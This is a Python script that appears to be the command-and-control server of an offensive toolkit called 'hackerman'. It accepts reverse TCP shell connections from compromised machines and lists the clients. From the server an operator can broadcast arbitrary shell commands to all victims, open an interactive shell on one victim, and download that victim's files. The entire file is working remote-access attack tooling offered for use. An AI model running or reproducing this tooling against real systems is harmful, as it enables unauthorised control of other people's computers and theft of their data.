#!/usr/bin/python3

from hackerman.handlers import reverse_tcp
from hackerman.ui import shell
from hackerman import utils
from termcolor import colored as c
import _thread, time, code, argparse

quitsig = False
man = {
	'exit':'quits the program',
	'help':'prints the help menu',
	'man $cmd':'prints help for $cmd command',
	'show $(clients)':'shows $',
	'broadcast "$cmd"':'sends $cmd command to all clients (must be in quotation marks)',
	'interact $client':'enter an interactive shell with $client'
}
climan = {
	'exit':'exits interactive client shell',
	'info':'prints client info',
	'help':'prints the help menu',
	'sh "$cmd"':'runs $cmd command on client (must be in double quotation marks)',
	'dl $fn $of':'downloads $fn and saves to $of locally',
	'cd $dir':'changes directory to $dir',
	'man $cmd':'prints help for $cmd command'
}

alert = lambda msg: print(c("[!]","red"),msg)
plus = lambda msg: print(c("[+]","green"),msg)
minus = lambda msg: print(c("[-]","cyan"),msg)
star = lambda msg: print(c("[*]","yellow"),msg)

class Server(object):
	def __init__(self, port, password):
		self.port = port
		self.password = password
		self.clients = {}
	def listen(self):
		client = reverse_tcp.Handler(self.port, self.password)
		name = utils.b64e(utils.uid().encode())
		if name[:4] in self.clients:
			name = name[:6]
		else:
			name = name[:4]
		if name in self.clients:
			raise RuntimeError("Too many clients")
		self.clients[name] = client

	def getclientinfo(self, name):
		if not name in self.clients:
			return None
		cli = self.clients[name]

		usr = cli.sh("whoami").decode().strip()
		wdir = cli.sh("pwd").decode().strip()
		shell = cli.sh("echo $SHELL").decode().strip()
		return {'user':usr, 'dir':wdir, 'shell':shell}

	def broadcast_sh(self, cmd):
		res = {}
		for name in self.clients:
			res[name] = self.clients[name].sh(cmd)
		return res
def listen_th(srv):
	while not quitsig:
		srv.listen()

class MainHandler(object):
	def __init__(self):
		self.commands = []
		for i in man: self.commands.append(i)
	def handle(self, cmd):
		if cmd == "exit":
			return "exit"
		elif cmd == "help":
			p = []
			for i in man:
				p.append("%s : %s" % (c(i,"green"),man[i]))
			print("\n".join(p))
		elif ' ' in cmd:
			parts = cmd.split(" ")
			if parts[0] == "man":
				try:
					q = parts[1]
					print("%s : %s" % (c(q,"green"),man[q]))
				except Exception as e:
					alert(str(e))
			elif parts[0] == "show":
				try:
					if parts[1] == "clients" or parts[1] == "client":
						print(c("Clients:"), ', '.join(srv.clients))
				except Exception as e:
					alert(str(e))
			elif parts[0] == "broadcast":
				if not '"' in cmd:
					alert("Command needs to be in double quotation marks")
				try:
					cm = '"'.join(cmd.split('"')[1:-1])
					res = srv.broadcast_sh(cm)
					for i in res:
						print(c(i,"green"),":",res[i].strip())
				except Exception as e:
					alert(str(e))
			elif parts[0] == "interact":
				try:
					if not parts[1] in srv.clients:
						alert("Client [%s] not in client list" % parts[1])
					else:
						hnd = ClientHandler(srv.clients[parts[1]],srv)
						shell.start_shell(hnd)
				except Exception as e:
					alert(str(e))
			else:
				alert("Unknown command")
		else:
			alert("Unknown command")

class ClientHandler(object):
	def __init__(self, client, srv):
		self.commands = []
		for i in climan:
			self.commands.append(i)
		self.cli = client
		self.srv = srv
	def handle(self, cmd):
		if cmd == "exit":
			return "exit"
		elif cmd == "help":
			p = []
			for i in climan:
				p.append("%s : %s" % (c(i,"green"),climan[i]))
			print("\n".join(p))
		elif cmd == "info":
			for i in self.srv.clients:
				if self.srv.clients[i] == self.cli:
					cliname = i
			res = self.srv.getclientinfo(cliname)
			for i in res:
				print(c(i,"green")+" : "+res[i])
		elif ' ' in cmd:
			parts = cmd.split(" ")
			if parts[0] == "man":
				try:
					q = parts[1]
					print("%s : %s" % (c(q,"green"),climan[q]))
				except Exception as e:
					alert(str(e))
			elif parts[0] == "sh":
				try:
					cm = '"'.join(cmd.split('"')[1:-1])
					res = utils.force_decode(self.cli.sh(cm).strip())
					print(res)
				except Exception as e:
					alert(e)
			elif parts[0] == "dl":
				try:
					fn = parts[1]
					of = parts[2]
					dat = self.cli.dl(fn)
					with open(of,"wb") as f:
						f.write(dat)
					plus("Success")
				except Exception as e:
					alert(str(e))
			elif parts[0] == "cd":
				dr = parts[1]
				if self.cli.cd(dr):
					plus("Okay")
				else:
					alert("Error")
			else:
				alert("Unknown command")
		else:
			alert("Unknown command")

def parse_args():
	p = argparse.ArgumentParser()
	p.add_argument(
		"port",
		help=("Port to run server on. Eg: 1337"),
		type=int)
	p.add_argument(
		"password",
		help=("Password for encryption. Eg: lamepassword"))
	return p.parse_args()
def main(args):
	globals()['srv'] = Server(args.port, args.password)
	_thread.start_new_thread(listen_th, (srv, ))
	shell.start_shell(MainHandler())
if __name__ == "__main__":
	main(parse_args())
